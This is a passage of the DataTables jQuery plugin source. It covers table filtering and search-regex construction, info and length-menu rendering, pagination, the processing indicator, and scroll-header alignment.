			/* Global filter */

			_fnFilter( oSettings, oInput.sSearch, iForce, fnRegex(oInput), oInput.bSmart, oInput.bCaseInsensitive );

			fnSaveFilter( oInput );

	

			/* Now do the individual column filter */

			for ( var i=0 ; i<aoPrevSearch.length ; i++ )

			{

				_fnFilterColumn( oSettings, aoPrevSearch[i].sSearch, i, fnRegex(aoPrevSearch[i]),

					aoPrevSearch[i].bSmart, aoPrevSearch[i].bCaseInsensitive );

			}

	

			/* Custom filtering */

			_fnFilterCustom( oSettings );

		}

		else

		{

			fnSaveFilter( oInput );

		}

	

		/* Tell the draw function we have been filtering */

		oSettings.bFiltered = true;

		_fnCallbackFire( oSettings, null, 'search', [oSettings] );

	}

	

	

	/**

	 * Apply custom filtering functions

	 *  @param {object} oSettings dataTables settings object

	 *  @memberof DataTable#oApi

	 */

	function _fnFilterCustom( settings )

	{

		var filters = DataTable.ext.search;

		var displayRows = settings.aiDisplay;

		var row, rowIdx;

	

		for ( var i=0, ien=filters.length ; i<ien ; i++ ) {

			var rows = [];

	

			// Loop over each row and see if it should be included

			for ( var j=0, jen=displayRows.length ; j<jen ; j++ ) {

				rowIdx = displayRows[ j ];

				row = settings.aoData[ rowIdx ];

	

				if ( filters[i]( settings, row._aFilterData, rowIdx, row._aData, j ) ) {

					rows.push( rowIdx );

				}

			}

	

			// So the array reference doesn't break set the results into the

			// existing array

			displayRows.length = 0;

			$.merge( displayRows, rows );

		}

	}

	

	

	/**

	 * Filter the table on a per-column basis

	 *  @param {object} oSettings dataTables settings object

	 *  @param {string} sInput string to filter on

	 *  @param {int} iColumn column to filter

	 *  @param {bool} bRegex treat search string as a regular expression or not

	 *  @param {bool} bSmart use smart filtering or not

	 *  @param {bool} bCaseInsensitive Do case insenstive matching or not

	 *  @memberof DataTable#oApi

	 */

	function _fnFilterColumn ( settings, searchStr, colIdx, regex, smart, caseInsensitive )

	{

		if ( searchStr === '' ) {

			return;

		}

	

		var data;

		var out = [];

		var display = settings.aiDisplay;

		var rpSearch = _fnFilterCreateSearch( searchStr, regex, smart, caseInsensitive );

	

		for ( var i=0 ; i<display.length ; i++ ) {

			data = settings.aoData[ display[i] ]._aFilterData[ colIdx ];

	

			if ( rpSearch.test( data ) ) {

				out.push( display[i] );

			}

		}

	

		settings.aiDisplay = out;

	}

	

	

	/**

	 * Filter the data table based on user input and draw the table

	 *  @param {object} settings dataTables settings object

	 *  @param {string} input string to filter on

	 *  @param {int} force optional - force a research of the master array (1) or not (undefined or 0)

	 *  @param {bool} regex treat as a regular expression or not

	 *  @param {bool} smart perform smart filtering or not

	 *  @param {bool} caseInsensitive Do case insenstive matching or not

	 *  @memberof DataTable#oApi

	 */

	function _fnFilter( settings, input, force, regex, smart, caseInsensitive )

	{

		var rpSearch = _fnFilterCreateSearch( input, regex, smart, caseInsensitive );

		var prevSearch = settings.oPreviousSearch.sSearch;

		var displayMaster = settings.aiDisplayMaster;

		var display, invalidated, i;

		var filtered = [];

	

		// Need to take account of custom filtering functions - always filter

		if ( DataTable.ext.search.length !== 0 ) {

			force = true;

		}

	

		// Check if any of the rows were invalidated

		invalidated = _fnFilterData( settings );

	

		// If the input is blank - we just want the full data set

		if ( input.length <= 0 ) {

			settings.aiDisplay = displayMaster.slice();

		}

		else {

			// New search - start from the master array

			if ( invalidated ||

				 force ||

				 regex ||

				 prevSearch.length > input.length ||

				 input.indexOf(prevSearch) !== 0 ||

				 settings.bSorted // On resort, the display master needs to be

				                  // re-filtered since indexes will have changed

			) {

				settings.aiDisplay = displayMaster.slice();

			}

	

			// Search the display array

			display = settings.aiDisplay;

	

			for ( i=0 ; i<display.length ; i++ ) {

				if ( rpSearch.test( settings.aoData[ display[i] ]._sFilterRow ) ) {

					filtered.push( display[i] );

				}

			}

	

			settings.aiDisplay = filtered;

		}

	}

	

	

	/**

	 * Build a regular expression object suitable for searching a table

	 *  @param {string} sSearch string to search for

	 *  @param {bool} bRegex treat as a regular expression or not

	 *  @param {bool} bSmart perform smart filtering or not

	 *  @param {bool} bCaseInsensitive Do case insensitive matching or not

	 *  @returns {RegExp} constructed object

	 *  @memberof DataTable#oApi

	 */

	function _fnFilterCreateSearch( search, regex, smart, caseInsensitive )

	{

		search = regex ?

			search :

			_fnEscapeRegex( search );

		

		if ( smart ) {

			/* For smart filtering we want to allow the search to work regardless of

			 * word order. We also want double quoted text to be preserved, so word

			 * order is important - a la google. So this is what we want to

			 * generate:

			 * 

			 * ^(?=.*?\bone\b)(?=.*?\btwo three\b)(?=.*?\bfour\b).*$

			 */

			var a = $.map( search.match( /"[^"]+"|[^ ]+/g ) || [''], function ( word ) {

				if ( word.charAt(0) === '"' ) {

					var m = word.match( /^"(.*)"$/ );

					word = m ? m[1] : word;

				}

	

				return word.replace('"', '');

			} );

	

			search = '^(?=.*?'+a.join( ')(?=.*?' )+').*$';

		}

	

		return new RegExp( search, caseInsensitive ? 'i' : '' );

	}

	

	

	/**

	 * Escape a string such that it can be used in a regular expression

	 *  @param {string} sVal string to escape

	 *  @returns {string} escaped string

	 *  @memberof DataTable#oApi

	 */

	var _fnEscapeRegex = DataTable.util.escapeRegex;

	

	var __filter_div = $('<div>')[0];

	var __filter_div_textContent = __filter_div.textContent !== undefined;

	

	// Update the filtering data for each row if needed (by invalidation or first run)

	function _fnFilterData ( settings )

	{

		var columns = settings.aoColumns;

		var column;

		var i, j, ien, jen, filterData, cellData, row;

		var fomatters = DataTable.ext.type.search;

		var wasInvalidated = false;

	

		for ( i=0, ien=settings.aoData.length ; i<ien ; i++ ) {

			row = settings.aoData[i];

	

			if ( ! row._aFilterData ) {

				filterData = [];

	

				for ( j=0, jen=columns.length ; j<jen ; j++ ) {

					column = columns[j];

	

					if ( column.bSearchable ) {

						cellData = _fnGetCellData( settings, i, j, 'filter' );

	

						if ( fomatters[ column.sType ] ) {

							cellData = fomatters[ column.sType ]( cellData );

						}

	

						// Search in DataTables 1.10 is string based. In 1.11 this

						// should be altered to also allow strict type checking.

						if ( cellData === null ) {

							cellData = '';

						}

	

						if ( typeof cellData !== 'string' && cellData.toString ) {

							cellData = cellData.toString();

						}

					}

					else {

						cellData = '';

					}

	

					// If it looks like there is an HTML entity in the string,

					// attempt to decode it so sorting works as expected. Note that

					// we could use a single line of jQuery to do this, but the DOM

					// method used here is much faster http://jsperf.com/html-decode

					if ( cellData.indexOf && cellData.indexOf('&') !== -1 ) {

						__filter_div.innerHTML = cellData;

						cellData = __filter_div_textContent ?

							__filter_div.textContent :

							__filter_div.innerText;

					}

	

					if ( cellData.replace ) {

						cellData = cellData.replace(/[\r\n\u2028]/g, '');

					}

	

					filterData.push( cellData );

				}

	

				row._aFilterData = filterData;

				row._sFilterRow = filterData.join('  ');

				wasInvalidated = true;

			}

		}

	

		return wasInvalidated;

	}

	

	

	/**

	 * Convert from the internal Hungarian notation to camelCase for external

	 * interaction

	 *  @param {object} obj Object to convert

	 *  @returns {object} Inverted object

	 *  @memberof DataTable#oApi

	 */

	function _fnSearchToCamel ( obj )

	{

		return {

			search:          obj.sSearch,

			smart:           obj.bSmart,

			regex:           obj.bRegex,

			caseInsensitive: obj.bCaseInsensitive

		};

	}

	

	

	

	/**

	 * Convert from camelCase notation to the internal Hungarian. We could use the

	 * Hungarian convert function here, but this is cleaner

	 *  @param {object} obj Object to convert

	 *  @returns {object} Inverted object

	 *  @memberof DataTable#oApi

	 */

	function _fnSearchToHung ( obj )

	{

		return {

			sSearch:          obj.search,

			bSmart:           obj.smart,

			bRegex:           obj.regex,

			bCaseInsensitive: obj.caseInsensitive

		};

	}

	

	/**

	 * Generate the node required for the info display

	 *  @param {object} oSettings dataTables settings object

	 *  @returns {node} Information element

	 *  @memberof DataTable#oApi

	 */

	function _fnFeatureHtmlInfo ( settings )

	{

		var

			tid = settings.sTableId,

			nodes = settings.aanFeatures.i,

			n = $('<div/>', {

				'class': settings.oClasses.sInfo,

				'id': ! nodes ? tid+'_info' : null

			} );

	

		if ( ! nodes ) {

			// Update display on each draw

			settings.aoDrawCallback.push( {

				"fn": _fnUpdateInfo,

				"sName": "information"

			} );

	

			n

				.attr( 'role', 'status' )

				.attr( 'aria-live', 'polite' );

	

			// Table is described by our info div

			$(settings.nTable).attr( 'aria-describedby', tid+'_info' );

		}

	

		return n[0];

	}

	

	

	/**

	 * Update the information elements in the display

	 *  @param {object} settings dataTables settings object

	 *  @memberof DataTable#oApi

	 */

	function _fnUpdateInfo ( settings )

	{

		/* Show information about the table */

		var nodes = settings.aanFeatures.i;

		if ( nodes.length === 0 ) {

			return;

		}

	

		var

			lang  = settings.oLanguage,

			start = settings._iDisplayStart+1,

			end   = settings.fnDisplayEnd(),

			max   = settings.fnRecordsTotal(),

			total = settings.fnRecordsDisplay(),

			out   = total ?

				lang.sInfo :

				lang.sInfoEmpty;

	

		if ( total !== max ) {

			/* Record set after filtering */

			out += ' ' + lang.sInfoFiltered;

		}

	

		// Convert the macros

		out += lang.sInfoPostFix;

		out = _fnInfoMacros( settings, out );

	

		var callback = lang.fnInfoCallback;

		if ( callback !== null ) {

			out = callback.call( settings.oInstance,

				settings, start, end, max, total, out

			);

		}

	

		$(nodes).html( out );

	}

	

	

	function _fnInfoMacros ( settings, str )

	{

		// When infinite scrolling, we are always starting at 1. _iDisplayStart is used only

		// internally

		var

			formatter  = settings.fnFormatNumber,

			start      = settings._iDisplayStart+1,

			len        = settings._iDisplayLength,

			vis        = settings.fnRecordsDisplay(),

			all        = len === -1;

	

		return str.

			replace(/_START_/g, formatter.call( settings, start ) ).

			replace(/_END_/g,   formatter.call( settings, settings.fnDisplayEnd() ) ).

			replace(/_MAX_/g,   formatter.call( settings, settings.fnRecordsTotal() ) ).

			replace(/_TOTAL_/g, formatter.call( settings, vis ) ).

			replace(/_PAGE_/g,  formatter.call( settings, all ? 1 : Math.ceil( start / len ) ) ).

			replace(/_PAGES_/g, formatter.call( settings, all ? 1 : Math.ceil( vis / len ) ) );

	}

	

	

	

	/**

	 * Draw the table for the first time, adding all required features

	 *  @param {object} settings dataTables settings object

	 *  @memberof DataTable#oApi

	 */

	function _fnInitialise ( settings )

	{

		var i, iLen, iAjaxStart=settings.iInitDisplayStart;

		var columns = settings.aoColumns, column;

		var features = settings.oFeatures;

		var deferLoading = settings.bDeferLoading; // value modified by the draw

	

		/* Ensure that the table data is fully initialised */

		if ( ! settings.bInitialised ) {

			setTimeout( function(){ _fnInitialise( settings ); }, 200 );

			return;

		}

	

		/* Show the display HTML options */

		_fnAddOptionsHtml( settings );

	

		/* Build and draw the header / footer for the table */

		_fnBuildHead( settings );

		_fnDrawHead( settings, settings.aoHeader );

		_fnDrawHead( settings, settings.aoFooter );

	

		/* Okay to show that something is going on now */

		_fnProcessingDisplay( settings, true );

	

		/* Calculate sizes for columns */

		if ( features.bAutoWidth ) {

			_fnCalculateColumnWidths( settings );

		}

	

		for ( i=0, iLen=columns.length ; i<iLen ; i++ ) {

			column = columns[i];

	

			if ( column.sWidth ) {

				column.nTh.style.width = _fnStringToCss( column.sWidth );

			}

		}

	

		_fnCallbackFire( settings, null, 'preInit', [settings] );

	

		// If there is default sorting required - let's do it. The sort function

		// will do the drawing for us. Otherwise we draw the table regardless of the

		// Ajax source - this allows the table to look initialised for Ajax sourcing

		// data (show 'loading' message possibly)

		_fnReDraw( settings );

	

		// Server-side processing init complete is done by _fnAjaxUpdateDraw

		var dataSrc = _fnDataSource( settings );

		if ( dataSrc != 'ssp' || deferLoading ) {

			// if there is an ajax source load the data

			if ( dataSrc == 'ajax' ) {

				_fnBuildAjax( settings, [], function(json) {

					var aData = _fnAjaxDataSrc( settings, json );

	

					// Got the data - add it to the table

					for ( i=0 ; i<aData.length ; i++ ) {

						_fnAddData( settings, aData[i] );

					}

	

					// Reset the init display for cookie saving. We've already done

					// a filter, and therefore cleared it before. So we need to make

					// it appear 'fresh'

					settings.iInitDisplayStart = iAjaxStart;

	

					_fnReDraw( settings );

	

					_fnProcessingDisplay( settings, false );

					_fnInitComplete( settings, json );

				}, settings );

			}

			else {

				_fnProcessingDisplay( settings, false );

				_fnInitComplete( settings );

			}

		}

	}

	

	

	/**

	 * Draw the table for the first time, adding all required features

	 *  @param {object} oSettings dataTables settings object

	 *  @param {object} [json] JSON from the server that completed the table, if using Ajax source

	 *    with client-side processing (optional)

	 *  @memberof DataTable#oApi

	 */

	function _fnInitComplete ( settings, json )

	{

		settings._bInitComplete = true;

	

		// When data was added after the initialisation (data or Ajax) we need to

		// calculate the column sizing

		if ( json || settings.oInit.aaData ) {

			_fnAdjustColumnSizing( settings );

		}

	

		_fnCallbackFire( settings, null, 'plugin-init', [settings, json] );

		_fnCallbackFire( settings, 'aoInitComplete', 'init', [settings, json] );

	}

	

	

	function _fnLengthChange ( settings, val )

	{

		var len = parseInt( val, 10 );

		settings._iDisplayLength = len;

	

		_fnLengthOverflow( settings );

	

		// Fire length change event

		_fnCallbackFire( settings, null, 'length', [settings, len] );

	}

	

	

	/**

	 * Generate the node required for user display length changing

	 *  @param {object} settings dataTables settings object

	 *  @returns {node} Display length feature node

	 *  @memberof DataTable#oApi

	 */

	function _fnFeatureHtmlLength ( settings )

	{

		var

			classes  = settings.oClasses,

			tableId  = settings.sTableId,

			menu     = settings.aLengthMenu,

			d2       = $.isArray( menu[0] ),

			lengths  = d2 ? menu[0] : menu,

			language = d2 ? menu[1] : menu;

	

		var select = $('<select/>', {

			'name':          tableId+'_length',

			'aria-controls': tableId,

			'class':         classes.sLengthSelect

		} );

	

		for ( var i=0, ien=lengths.length ; i<ien ; i++ ) {

			select[0][ i ] = new Option(

				typeof language[i] === 'number' ?

					settings.fnFormatNumber( language[i] ) :

					language[i],

				lengths[i]

			);

		}

	

		var div = $('<div><label/></div>').addClass( classes.sLength );

		if ( ! settings.aanFeatures.l ) {

			div[0].id = tableId+'_length';

		}

	

		div.children().append(

			settings.oLanguage.sLengthMenu.replace( '_MENU_', select[0].outerHTML )

		);

	

		// Can't use `select` variable as user might provide their own and the

		// reference is broken by the use of outerHTML

		$('select', div)

			.val( settings._iDisplayLength )

			.on( 'change.DT', function(e) {

				_fnLengthChange( settings, $(this).val() );

				_fnDraw( settings );

			} );

	

		// Update node value whenever anything changes the table's length

		$(settings.nTable).on( 'length.dt.DT', function (e, s, len) {

			if ( settings === s ) {

				$('select', div).val( len );

			}

		} );

	

		return div[0];

	}

	

	

	

	/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *

	 * Note that most of the paging logic is done in

	 * DataTable.ext.pager

	 */

	

	/**

	 * Generate the node required for default pagination

	 *  @param {object} oSettings dataTables settings object

	 *  @returns {node} Pagination feature node

	 *  @memberof DataTable#oApi

	 */

	function _fnFeatureHtmlPaginate ( settings )

	{

		var

			type   = settings.sPaginationType,

			plugin = DataTable.ext.pager[ type ],

			modern = typeof plugin === 'function',

			redraw = function( settings ) {

				_fnDraw( settings );

			},

			node = $('<div/>').addClass( settings.oClasses.sPaging + type )[0],

			features = settings.aanFeatures;

	

		if ( ! modern ) {

			plugin.fnInit( settings, node, redraw );

		}

	

		/* Add a draw callback for the pagination on first instance, to update the paging display */

		if ( ! features.p )

		{

			node.id = settings.sTableId+'_paginate';

	

			settings.aoDrawCallback.push( {

				"fn": function( settings ) {

					if ( modern ) {

						var

							start      = settings._iDisplayStart,

							len        = settings._iDisplayLength,

							visRecords = settings.fnRecordsDisplay(),

							all        = len === -1,

							page = all ? 0 : Math.ceil( start / len ),

							pages = all ? 1 : Math.ceil( visRecords / len ),

							buttons = plugin(page, pages),

							i, ien;

	

						for ( i=0, ien=features.p.length ; i<ien ; i++ ) {

							_fnRenderer( settings, 'pageButton' )(

								settings, features.p[i], i, buttons, page, pages

							);

						}

					}

					else {

						plugin.fnUpdate( settings, redraw );

					}

				},

				"sName": "pagination"

			} );

		}

	

		return node;

	}

	

	

	/**

	 * Alter the display settings to change the page

	 *  @param {object} settings DataTables settings object

	 *  @param {string|int} action Paging action to take: "first", "previous",

	 *    "next" or "last" or page number to jump to (integer)

	 *  @param [bool] redraw Automatically draw the update or not

	 *  @returns {bool} true page has changed, false - no change

	 *  @memberof DataTable#oApi

	 */

	function _fnPageChange ( settings, action, redraw )

	{

		var

			start     = settings._iDisplayStart,

			len       = settings._iDisplayLength,

			records   = settings.fnRecordsDisplay();

	

		if ( records === 0 || len === -1 )

		{

			start = 0;

		}

		else if ( typeof action === "number" )

		{

			start = action * len;

	

			if ( start > records )

			{

				start = 0;

			}

		}

		else if ( action == "first" )

		{

			start = 0;

		}

		else if ( action == "previous" )

		{

			start = len >= 0 ?

				start - len :

				0;

	

			if ( start < 0 )

			{

			  start = 0;

			}

		}

		else if ( action == "next" )

		{

			if ( start + len < records )

			{

				start += len;

			}

		}

		else if ( action == "last" )

		{

			start = Math.floor( (records-1) / len) * len;

		}

		else

		{

			_fnLog( settings, 0, "Unknown paging action: "+action, 5 );

		}

	

		var changed = settings._iDisplayStart !== start;

		settings._iDisplayStart = start;

	

		if ( changed ) {

			_fnCallbackFire( settings, null, 'page', [settings] );

	

			if ( redraw ) {

				_fnDraw( settings );

			}

		}

	

		return changed;

	}

	

	

	

	/**

	 * Generate the node required for the processing node

	 *  @param {object} settings dataTables settings object

	 *  @returns {node} Processing element

	 *  @memberof DataTable#oApi

	 */

	function _fnFeatureHtmlProcessing ( settings )

	{

		return $('<div/>', {

				'id': ! settings.aanFeatures.r ? settings.sTableId+'_processing' : null,

				'class': settings.oClasses.sProcessing

			} )

			.html( settings.oLanguage.sProcessing )

			.insertBefore( settings.nTable )[0];

	}

	

	

	/**

	 * Display or hide the processing indicator

	 *  @param {object} settings dataTables settings object

	 *  @param {bool} show Show the processing indicator (true) or not (false)

	 *  @memberof DataTable#oApi

	 */

	function _fnProcessingDisplay ( settings, show )

	{

		if ( settings.oFeatures.bProcessing ) {

			$(settings.aanFeatures.r).css( 'display', show ? 'block' : 'none' );

		}

	

		_fnCallbackFire( settings, null, 'processing', [settings, show] );

	}

	

	/**

	 * Add any control elements for the table - specifically scrolling

	 *  @param {object} settings dataTables settings object

	 *  @returns {node} Node to add to the DOM

	 *  @memberof DataTable#oApi

	 */

	function _fnFeatureHtmlTable ( settings )

	{

		var table = $(settings.nTable);

	

		// Add the ARIA grid role to the table

		table.attr( 'role', 'grid' );

	

		// Scrolling from here on in

		var scroll = settings.oScroll;

	

		if ( scroll.sX === '' && scroll.sY === '' ) {

			return settings.nTable;

		}

	

		var scrollX = scroll.sX;

		var scrollY = scroll.sY;

		var classes = settings.oClasses;

		var caption = table.children('caption');

		var captionSide = caption.length ? caption[0]._captionSide : null;

		var headerClone = $( table[0].cloneNode(false) );

		var footerClone = $( table[0].cloneNode(false) );

		var footer = table.children('tfoot');

		var _div = '<div/>';

		var size = function ( s ) {

			return !s ? null : _fnStringToCss( s );

		};

	

		if ( ! footer.length ) {

			footer = null;

		}

	

		/*

		 * The HTML structure that we want to generate in this function is:

		 *  div - scroller

		 *    div - scroll head

		 *      div - scroll head inner

		 *        table - scroll head table

		 *          thead - thead

		 *    div - scroll body

		 *      table - table (master table)

		 *        thead - thead clone for sizing

		 *        tbody - tbody

		 *    div - scroll foot

		 *      div - scroll foot inner

		 *        table - scroll foot table

		 *          tfoot - tfoot

		 */

		var scroller = $( _div, { 'class': classes.sScrollWrapper } )

			.append(

				$(_div, { 'class': classes.sScrollHead } )

					.css( {

						overflow: 'hidden',

						position: 'relative',

						border: 0,

						width: scrollX ? size(scrollX) : '100%'

					} )

					.append(

						$(_div, { 'class': classes.sScrollHeadInner } )

							.css( {

								'box-sizing': 'content-box',

								width: scroll.sXInner || '100%'

							} )

							.append(

								headerClone

									.removeAttr('id')

									.css( 'margin-left', 0 )

									.append( captionSide === 'top' ? caption : null )

									.append(

										table.children('thead')

									)

							)

					)

			)

			.append(

				$(_div, { 'class': classes.sScrollBody } )

					.css( {

						position: 'relative',

						overflow: 'auto',

						width: size( scrollX )

					} )

					.append( table )

			);

	

		if ( footer ) {

			scroller.append(

				$(_div, { 'class': classes.sScrollFoot } )

					.css( {

						overflow: 'hidden',

						border: 0,

						width: scrollX ? size(scrollX) : '100%'

					} )

					.append(

						$(_div, { 'class': classes.sScrollFootInner } )

							.append(

								footerClone

									.removeAttr('id')

									.css( 'margin-left', 0 )

									.append( captionSide === 'bottom' ? caption : null )

									.append(

										table.children('tfoot')

									)

							)

					)

			);

		}

	

		var children = scroller.children();

		var scrollHead = children[0];

		var scrollBody = children[1];

		var scrollFoot = footer ? children[2] : null;

	

		// When the body is scrolled, then we also want to scroll the headers

		if ( scrollX ) {

			$(scrollBody).on( 'scroll.DT', function (e) {

				var scrollLeft = this.scrollLeft;

	

				scrollHead.scrollLeft = scrollLeft;

	

				if ( footer ) {

					scrollFoot.scrollLeft = scrollLeft;

				}

			} );

		}

	

		$(scrollBody).css('max-height', scrollY);

		if (! scroll.bCollapse) {

			$(scrollBody).css('height', scrollY);

		}

	

		settings.nScrollHead = scrollHead;

		settings.nScrollBody = scrollBody;

		settings.nScrollFoot = scrollFoot;

	

		// On redraw - align columns

		settings.aoDrawCallback.push( {

			"fn": _fnScrollDraw,

			"sName": "scrolling"

		} );

	

		return scroller[0];

	}

	

	

	

	/**

	 * Update the header, footer and body tables for resizing - i.e. column

	 * alignment.

	 *

	 * Welcome to the most horrible function DataTables. The process that this

	 * function follows is basically:

	 *   1. Re-create the table inside the scrolling div

	 *   2. Take live measurements from the DOM

	 *   3. Apply the measurements to align the columns

	 *   4. Clean up

	 *

	 *  @param {object} settings dataTables settings object

	 *  @memberof DataTable#oApi

	 */

	function _fnScrollDraw ( settings )

	{

		// Given that this is such a monster function, a lot of variables are use

		// to try and keep the minimised size as small as possible

		var

			scroll         = settings.oScroll,

			scrollX        = scroll.sX,

			scrollXInner   = scroll.sXInner,

			scrollY        = scroll.sY,

			barWidth       = scroll.iBarWidth,

			divHeader      = $(settings.nScrollHead),

			divHeaderStyle = divHeader[0].style,

			divHeaderInner = divHeader.children('div'),

			divHeaderInnerStyle = divHeaderInner[0].style,

			divHeaderTable = divHeaderInner.children('table'),

			divBodyEl      = settings.nScrollBody,

			divBody        = $(divBodyEl),

			divBodyStyle   = divBodyEl.style,

			divFooter      = $(settings.nScrollFoot),

			divFooterInner = divFooter.children('div'),

			divFooterTable = divFooterInner.children('table'),

			header         = $(settings.nTHead),

			table          = $(settings.nTable),

			tableEl        = table[0],

			tableStyle     = tableEl.style,

			footer         = settings.nTFoot ? $(settings.nTFoot) : null,

			browser        = settings.oBrowser,

			ie67           = browser.bScrollOversize,

			dtHeaderCells  = _pluck( settings.aoColumns, 'nTh' ),

			headerTrgEls, footerTrgEls,

			headerSrcEls, footerSrcEls,

			headerCopy, footerCopy,

			headerWidths=[], footerWidths=[],

			headerContent=[], footerContent=[],

			idx, correction, sanityWidth,

			zeroOut = function(nSizer) {

				var style = nSizer.style;

				style.paddingTop = "0";

				style.paddingBottom = "0";

				style.borderTopWidth = "0";

				style.borderBottomWidth = "0";

				style.height = 0;

			};

	

		// If the scrollbar visibility has changed from the last draw, we need to

		// adjust the column sizes as the table width will have changed to account

		// for the scrollbar

		var scrollBarVis = divBodyEl.scrollHeight > divBodyEl.clientHeight;

		

		if ( settings.scrollBarVis !== scrollBarVis && settings.scrollBarVis !== undefined ) {

			settings.scrollBarVis = scrollBarVis;

			_fnAdjustColumnSizing( settings );

			return; // adjust column sizing will call this function again

		}

		else {

			settings.scrollBarVis = scrollBarVis;

		}

	

		/*

		 * 1. Re-create the table inside the scrolling div

		 */

	

		// Remove the old minimised thead and tfoot elements in the inner table

		table.children('thead, tfoot').remove();

	

		if ( footer ) {

			footerCopy = footer.clone().prependTo( table );

			footerTrgEls = footer.find('tr'); // the original tfoot is in its own table and must be sized

			footerSrcEls = footerCopy.find('tr');

		}

	

		// Clone the current header and footer elements and then place it into the inner table

		headerCopy = header.clone().prependTo( table );

		headerTrgEls = header.find('tr'); // original header is in its own table

		headerSrcEls = headerCopy.find('tr');

		headerCopy.find('th, td').removeAttr('tabindex');

	

	

		/*

		 * 2. Take live measurements from the DOM - do not alter the DOM itself!

		 */

	

		// Remove old sizing and apply the calculated column widths

		// Get the unique column headers in the newly created (cloned) header. We want to apply the

		// calculated sizes to this header

		if ( ! scrollX )

		{

			divBodyStyle.width = '100%';

			divHeader[0].style.width = '100%';

		}

	

		$.each( _fnGetUniqueThs( settings, headerCopy ), function ( i, el ) {

			idx = _fnVisibleToColumnIndex( settings, i );

			el.style.width = settings.aoColumns[idx].sWidth;

		} );

	

		if ( footer ) {

			_fnApplyToChildren( function(n) {

				n.style.width = "";

			}, footerSrcEls );

		}

	

		// Size the table as a whole

		sanityWidth = table.outerWidth();

		if ( scrollX === "" ) {

			// No x scrolling

			tableStyle.width = "100%";

	

			// IE7 will make the width of the table when 100% include the scrollbar

			// - which is shouldn't. When there is a scrollbar we need to take this

			// into account.

			if ( ie67 && (table.find('tbody').height() > divBodyEl.offsetHeight ||

				divBody.css('overflow-y') == "scroll")

			) {

				tableStyle.width = _fnStringToCss( table.outerWidth() - barWidth);

			}

	

			// Recalculate the sanity width

			sanityWidth = table.outerWidth();

		}

		else if ( scrollXInner !== "" ) {

			// legacy x scroll inner has been given - use it

			tableStyle.width = _fnStringToCss(scrollXInner);

	

			// Recalculate the sanity width

			sanityWidth = table.outerWidth();

		}

	

		// Hidden header should have zero height, so remove padding and borders. Then

		// set the width based on the real headers

	

		// Apply all styles in one pass

		_fnApplyToChildren( zeroOut, headerSrcEls );

	

		// Read all widths in next pass

		_fnApplyToChildren( function(nSizer) {

			headerContent.push( nSizer.innerHTML );

			headerWidths.push( _fnStringToCss( $(nSizer).css('width') ) );

		}, headerSrcEls );

	

		// Apply all widths in final pass

		_fnApplyToChildren( function(nToSize, i) {

			// Only apply widths to the DataTables detected header cells - this

			// prevents complex headers from having contradictory sizes applied

			if ( $.inArray( nToSize, dtHeaderCells ) !== -1 ) {

				nToSize.style.width = headerWidths[i];

			}

		}, headerTrgEls );

	

		$(headerSrcEls).height(0);

	

		/* Same again with the footer if we have one */

		if ( footer )

		{

			_fnApplyToChildren( zeroOut, footerSrcEls );

	

			_fnApplyToChildren( function(nSizer) {

				footerContent.push( nSizer.innerHTML );

				footerWidths.push( _fnStringToCss( $(nSizer).css('width') ) );

			}, footerSrcEls );

	

			_fnApplyToChildren( function(nToSize, i) {

				nToSize.style.width = footerWidths[i];

			}, footerTrgEls );

	

			$(footerSrcEls).height(0);

		}

	

	

		/*

		 * 3. Apply the measurements

		 */

	

		// "Hide" the header and footer that we used for the sizing. We need to keep

		// the content of the cell so that the width applied to the header and body

		// both match, but we want to hide it completely. We want to also fix their

		// width to what they currently are

		_fnApplyToChildren( function(nSizer, i) {

			nSizer.innerHTML = '<div class="dataTables_sizing">'+headerContent[i]+'</div>';

			nSizer.childNodes[0].style.height = "0";

			nSizer.childNodes[0].style.overflow = "hidden";

			nSizer.style.width = headerWidths[i];

		}, headerSrcEls );

	

		if ( footer )

		{

			_fnApplyToChildren( function(nSizer, i) {

				nSizer.innerHTML = '<div class="dataTables_sizing">'+footerContent[i]+'</div>';

				nSizer.childNodes[0].style.height = "0";

				nSizer.childNodes[0].style.overflow = "hidden";

				nSizer.style.width = footerWidths[i];

			}, footerSrcEls );

		}

	

		// Sanity check that the table is of a sensible width. If not then we are going to get

		// misalignment - try to prevent this by not allowing the table to shrink below its min width

		if ( table.outerWidth() < sanityWidth )

		{

			// The min width depends upon if we have a vertical scrollbar visible or not */

			correction = ((divBodyEl.scrollHeight > divBodyEl.offsetHeight ||

				divBody.css('overflow-y') == "scroll")) ?

					sanityWidth+barWidth :

					sanityWidth;

	

			// IE6/7 are a law unto themselves...

			if ( ie67 && (divBodyEl.scrollHeight >

				divBodyEl.offsetHeight || divBody.css('overflow-y') == "scroll")

			) {

				tableStyle.width = _fnStringToCss( correction-barWidth );

			}

	

			// And give the user a warning that we've stopped the table getting too small

			if ( scrollX === "" || scrollXInner !== "" ) {

				_fnLog( settings, 1, 'Possible column misalignment', 6 );

			}

		}

		else

		{

			correction = '100%';

		}

	

		// Apply to the container elements

		divBodyStyle.width = _fnStringToCss( correction );

		divHeaderStyle.width = _fnStringToCss( correction );

	

		if ( footer ) {

			settings.nScrollFoot.style.width = _fnStringToCss( correction );

		}

	

	

		/*

		 * 4. Clean up

		 */

		if ( ! scrollY ) {

			/* IE7< puts a vertical scrollbar in place (when it shouldn't be) due to subtracting

			 * the scrollbar height from the visible display, rather than adding it on. We need to

			 * set the height in order to sort this. Don't want to do it in any other browsers.

			 */

			if ( ie67 ) {

				divBodyStyle.height = _fnStringToCss( tableEl.offsetHeight+barWidth );

			}

		}

	

		/* Finally set the width's of the header and footer tables */

		var iOuterWidth = table.outerWidth();

		divHeaderTable[0].style.width = _fnStringToCss( iOuterWidth );

		divHeaderInnerStyle.width = _fnStringToCss( iOuterWidth );

	

		// Figure out if there are scrollbar present - if so then we need a the header and footer to

		// provide a bit more space to allow "overflow" scrolling (i.e. past the scrollbar)

		var bScrolling = table.height() > divBodyEl.clientHeight || divBody.css('overflow-y') == "scroll";

		var padding = 'padding' + (browser.bScrollbarLeft ? 'Left' : 'Right' );

		divHeaderInnerStyle[ padding ] = bScrolling ? barWidth+"px" : "0px";

	

		if ( footer ) {

			divFooterTable[0].style.width = _fnStringToCss( iOuterWidth );

			divFooterInner[0].style.width = _fnStringToCss( iOuterWidth );

			divFooterInner[0].style[padding] = bScrolling ? barWidth+"px" : "0px";

		}

	

		// Correct DOM ordering for colgroup - comes before the thead

		table.children('colgroup').insertBefore( table.children('thead') );

	

		/* Adjust the position of the header in case we loose the y-scrollbar */

		divBody.trigger('scroll');

	

		// If sorting or filtering has occurred, jump the scrolling back to the top

